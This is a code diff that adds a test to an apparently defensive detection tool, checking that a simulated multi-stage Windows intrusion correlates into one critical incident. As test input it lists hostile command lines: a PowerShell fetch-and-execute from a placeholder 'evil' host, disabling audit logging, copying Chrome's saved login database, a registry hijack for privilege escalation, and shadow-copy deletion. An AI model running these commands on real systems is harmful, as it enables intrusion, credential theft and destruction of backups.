@@ -140,6 +140,39 @@ def main() -> int:
     _check("same PID across tactics merges",
            ks.observe("x.exe", "T1486", "encrypt", 2.0, pid=7003) is not None)
 
+    # [2c] A realistic multi-tactic intrusion, each step a REAL command run
+    # through the actual classifier, must correlate into ONE critical incident
+    # that reaches an objective tactic — detect-AND-block at the chain level.
+    from valkyrie.behavioral_rules import classify_behavior
+    _bn = lambda p: (p or "").replace("/", "\\").rsplit("\\", 1)[-1].lower()
+    intrusion = [
+        ("powershell.exe", "cmd.exe", r"powershell irm http://evil/a.ps1 | iex"),
+        ("auditpol.exe", "powershell.exe", r"auditpol /set /category:* /success:disable"),
+        ("cmd.exe", "powershell.exe", r'cmd /c copy "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" C:\Users\Public\ld.db'),
+        ("reg.exe", "powershell.exe", r"reg add HKCU\Software\Classes\ms-settings\shell\open\command /d evil.exe /f"),
+        ("wmic.exe", "powershell.exe", r"wmic shadowcopy delete /nointeractive"),
+    ]
+    kchain = KillChainCorrelator(window_seconds=600, min_tactics=3)
+    chain_final = None
+    all_detected = True
+    for i, (image, parent, cmd) in enumerate(intrusion):
+        hit = classify_behavior(_bn(image), _bn(parent), cmd, image)
+        if hit is None:
+            all_detected = False
+            continue
+        s = kchain.observe(_bn(image), hit["technique"], "step", 1000.0 + i,
+                           pid=4242, ppid=4241)
+        if s:
+            chain_final = s
+    _check("every step of the real intrusion is detected", all_detected)
+    _check("the intrusion correlates into a multi-stage incident",
+           chain_final is not None)
+    _check("chain reaches >=4 distinct tactics",
+           chain_final and chain_final["distinct_tactics"] >= 4)
+    _check("chain escalates to critical and reaches an objective tactic",
+           chain_final and chain_final["severity"] == "critical"
+           and chain_final["reaches_objective"])
+
     print("\n[3] Engine end-to-end")
     import tempfile
     from valkyrie.store import Store
